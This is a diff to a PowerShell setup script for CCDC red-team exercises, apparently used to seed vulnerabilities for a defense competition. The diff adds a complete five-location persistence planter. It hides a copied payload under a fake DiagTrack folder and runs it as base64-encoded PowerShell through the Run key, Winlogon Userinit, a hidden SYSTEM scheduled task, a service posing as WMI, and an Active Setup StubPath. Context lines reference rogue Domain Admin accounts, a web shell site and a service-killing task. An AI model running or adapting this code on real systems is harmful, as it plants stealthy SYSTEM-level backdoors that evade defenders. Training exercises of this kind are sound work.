@@ -2,8 +2,7 @@
 # CCDC Windows Combined Setup Script
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 # Combines attack setup scripts from SetupScripts/windows/, EXCEPT the target
-# provisioning script (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) and the
-# persistence script (CCDC_Windows_Persistence_ClusterBombShells.ps1).
+# provisioning script (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1).
 #
 # Sections, in order:
 #   1. Rogue users      — CCDC_Windows_Users_UsersAreInYourWalls.ps1
@@ -12,6 +11,8 @@
 #                         (rogue IIS site on :8080 with ASP page)
 #   3. Scheduled tasks  — CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1
 #                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
+#   4. Persistence      — CCDC_Windows_Persist_ClusterShells.ps1
+#                         (5-location startup persistence; prompts for payload path)
 #
 # The original scripts are untouched and still runnable individually —
 # this is just a single-shot version for standing everything up at once.
@@ -42,7 +43,7 @@ Write-Host ""
 # (from CCDC_Windows_Users_UsersAreInYourWalls.ps1)
 # =============================================================================
 function Invoke-RogueUsers {
-    Write-Section "1/3 — Rogue Users: AD Domain Admin backdoors"
+    Write-Section "1/4 — Rogue Users: AD Domain Admin backdoors"
 
     # Pull domain info dynamically
     try {
@@ -150,7 +151,7 @@ function Invoke-RogueUsers {
 # (from CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1)
 # =============================================================================
 function Invoke-RogueWebShell {
-    Write-Section "2/3 — Web Shell: Rogue IIS site on port 8080"
+    Write-Section "2/4 — Web Shell: Rogue IIS site on port 8080"
 
     $SiteName    = "evilwebpage"
     $SitePort    = 8080
@@ -395,7 +396,7 @@ function Invoke-RogueWebShell {
 # (from CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1)
 # =============================================================================
 function Invoke-ScheduledTasks {
-    Write-Section "3/3 — Scheduled Tasks: Notepad alert + service killer"
+    Write-Section "3/4 — Scheduled Tasks: Notepad alert + service killer"
 
     # ========== TASK 1: SillyNotepadAlert ==========
     $Task1Name        = "NotepadAlert"
@@ -521,17 +522,143 @@ foreach ($svc in $services) {
 }
 
 # =============================================================================
+# 4. PERSISTENCE — 5-location startup persistence planter
+# (from CCDC_Windows_Persist_ClusterShells.ps1)
+# =============================================================================
+function Invoke-PersistencePlanter {
+    Write-Section "4/4 — Persistence: 5-location startup planter"
+
+    $PayloadPath = ""
+    while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
+        $PayloadPath = (Read-Host "  Path to payload script").Trim()
+        if ([string]::IsNullOrWhiteSpace($PayloadPath)) {
+            Write-Err "Path cannot be empty."
+        }
+    }
+
+    if (-not (Test-Path $PayloadPath)) {
+        Write-Err "Payload not found: $PayloadPath"
+        return
+    }
+
+    Write-Info "Payload confirmed: $PayloadPath"
+    Write-Host ""
+
+    $DropDir = "C:\ProgramData\Microsoft\Windows\DiagTrack\Telemetry\cache"
+    if (-not (Test-Path $DropDir)) {
+        New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
+    }
+    $dirObj = Get-Item $DropDir -Force
+    $dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden
+
+    function Get-EncodedCommand { param([string]$ScriptPath)
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw))
+        return [Convert]::ToBase64String($bytes)
+    }
+
+    # [1/5] HKLM Run Key
+    Write-Info "[1/5] Planting in HKLM Run registry key ..."
+    $Reg1Name     = "WUDFComponentHost"
+    $Reg1Drop     = "$DropDir\wudf-host-svc.ps1"
+    Copy-Item -Path $PayloadPath -Destination $Reg1Drop -Force
+    $f1 = Get-Item $Reg1Drop -Force; $f1.Attributes = $f1.Attributes -bor [System.IO.FileAttributes]::Hidden
+    $Reg1Cmd = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Reg1Drop)"
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $Reg1Name -Value $Reg1Cmd -Type String -Force
+    Write-Success "  HKLM:\...\CurrentVersion\Run\$Reg1Name"
+    Write-Success "  Payload copy: $Reg1Drop (hidden)"
+    Write-Host ""
+
+    # [2/5] Winlogon Userinit
+    Write-Info "[2/5] Planting in Winlogon Userinit registry key ..."
+    $Reg2Key  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    $Reg2Drop = "$DropDir\userinit-ext.ps1"
+    Copy-Item -Path $PayloadPath -Destination $Reg2Drop -Force
+    $f2 = Get-Item $Reg2Drop -Force; $f2.Attributes = $f2.Attributes -bor [System.IO.FileAttributes]::Hidden
+    $Reg2Enc     = Get-EncodedCommand $Reg2Drop
+    $Reg2Append  = ",powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $Reg2Enc"
+    $Reg2Current = (Get-ItemProperty -Path $Reg2Key -Name Userinit).Userinit
+    if ($Reg2Current -notmatch [regex]::Escape("userinit-ext")) {
+        Set-ItemProperty -Path $Reg2Key -Name Userinit -Value ($Reg2Current.TrimEnd(',') + $Reg2Append) -Force
+    }
+    Write-Success "  HKLM:\...\Winlogon\Userinit (appended)"
+    Write-Success "  Payload copy: $Reg2Drop (hidden)"
+    Write-Host ""
+
+    # [3/5] Hidden scheduled task under \Microsoft\Windows\
+    Write-Info "[3/5] Planting hidden scheduled task in \Microsoft\Windows\ subfolder ..."
+    $Task3Name  = "DiagnosticsHub-StandardCollector"
+    $Task3Path  = "\Microsoft\Windows\DiagnosticsHub\"
+    $Task3Drop  = "$DropDir\diaghub-collector.ps1"
+    Copy-Item -Path $PayloadPath -Destination $Task3Drop -Force
+    $f3 = Get-Item $Task3Drop -Force; $f3.Attributes = $f3.Attributes -bor [System.IO.FileAttributes]::Hidden
+    $Task3Action    = New-ScheduledTaskAction -Execute "powershell.exe" `
+        -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Task3Drop)"
+    $Task3Trigger   = New-ScheduledTaskTrigger -AtStartup
+    $Task3Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
+        -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
+    $Task3Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $TaskSvc = New-Object -ComObject Schedule.Service; $TaskSvc.Connect()
+    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("DiagnosticsHub") } catch {
+        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("DiagnosticsHub") | Out-Null
+    }
+    Unregister-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Confirm:$false -ErrorAction SilentlyContinue
+    Register-ScheduledTask -TaskName $Task3Name -TaskPath $Task3Path -Action $Task3Action `
+        -Trigger $Task3Trigger -Settings $Task3Settings -Principal $Task3Principal `
+        -Description "Microsoft Diagnostics Hub standard data collector service" -Force | Out-Null
+    Write-Success "  $Task3Path$Task3Name (hidden)"
+    Write-Success "  Payload copy: $Task3Drop (hidden)"
+    Write-Host ""
+
+    # [4/5] Windows service (WMI lookalike)
+    Write-Info "[4/5] Planting as a Windows service (WMI lookalike) ..."
+    $Svc4Name = "WmiPrvSE-Helper"; $Svc4Drop = "$DropDir\wmiprvse-helper.ps1"
+    Copy-Item -Path $PayloadPath -Destination $Svc4Drop -Force
+    $f4 = Get-Item $Svc4Drop -Force; $f4.Attributes = $f4.Attributes -bor [System.IO.FileAttributes]::Hidden
+    $psExe       = "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $Svc4BinPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Svc4Drop`""
+    $existing = Get-Service -Name $Svc4Name -ErrorAction SilentlyContinue
+    if ($existing) { Stop-Service -Name $Svc4Name -Force -ErrorAction SilentlyContinue; sc.exe delete $Svc4Name | Out-Null; Start-Sleep -Seconds 2 }
+    sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
+    sc.exe description $Svc4Name "Provides host process for Windows Management Instrumentation providers." | Out-Null
+    sc.exe failure      $Svc4Name reset= 60 actions= restart/5000/restart/5000/restart/5000 | Out-Null
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$Svc4Name" -Name DisplayName -Value "WMI Provider Service Helper" -Force
+    Write-Success "  Service: $Svc4Name (AUTO_START, SYSTEM)"
+    Write-Success "  Payload copy: $Svc4Drop (hidden)"
+    Write-Host ""
+
+    # [5/5] Active Setup StubPath
+    Write-Info "[5/5] Planting in Active Setup Installed Components (StubPath) ..."
+    $AS5GUID    = "{89820200-ECBD-11CF-8B85-00AA005B4383}"
+    $AS5KeyPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$AS5GUID"
+    $AS5Drop    = "$DropDir\iecompat-stub.ps1"
+    Copy-Item -Path $PayloadPath -Destination $AS5Drop -Force
+    $f5 = Get-Item $AS5Drop -Force; $f5.Attributes = $f5.Attributes -bor [System.IO.FileAttributes]::Hidden
+    $AS5StubPath = "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $AS5Drop)"
+    if (-not (Test-Path $AS5KeyPath)) { New-Item -Path $AS5KeyPath -Force | Out-Null }
+    Set-ItemProperty -Path $AS5KeyPath -Name "(Default)"   -Value "Internet Explorer Core Fonts" -Force
+    Set-ItemProperty -Path $AS5KeyPath -Name StubPath      -Value $AS5StubPath -Force
+    Set-ItemProperty -Path $AS5KeyPath -Name Version       -Value "1,0,0,0" -Force
+    Set-ItemProperty -Path $AS5KeyPath -Name Locale        -Value "EN" -Force
+    Set-ItemProperty -Path $AS5KeyPath -Name IsInstalled   -Value 1 -Type DWord -Force
+    Write-Success "  HKLM:\...\Active Setup\Installed Components\$AS5GUID"
+    Write-Success "  Payload copy: $AS5Drop (hidden)"
+    Write-Host ""
+
+    Write-Success "Persistence planter complete — payload in 5 locations under $DropDir"
+}
+
+# =============================================================================
 # MAIN
 # =============================================================================
 try {
     Invoke-RogueUsers
     Invoke-RogueWebShell
     Invoke-ScheduledTasks
+    Invoke-PersistencePlanter
 
     Write-Section "ALL SECTIONS COMPLETE"
-    Write-Success "Rogue users, web shell, and scheduled tasks are all planted."
+    Write-Success "Rogue users, web shell, scheduled tasks, and persistence are all planted."
     Write-Warn "Target setup (CCDC_Windows_TargetSetup_HTTP_FTP_DNS.ps1) was NOT run — run it separately if needed."
-    Write-Warn "Persistence (CCDC_Windows_Persistence_ClusterBombShells.ps1) was NOT run — run it separately if needed."
     Write-Host ""
 } catch {
     Write-Err "Script failed: $_"
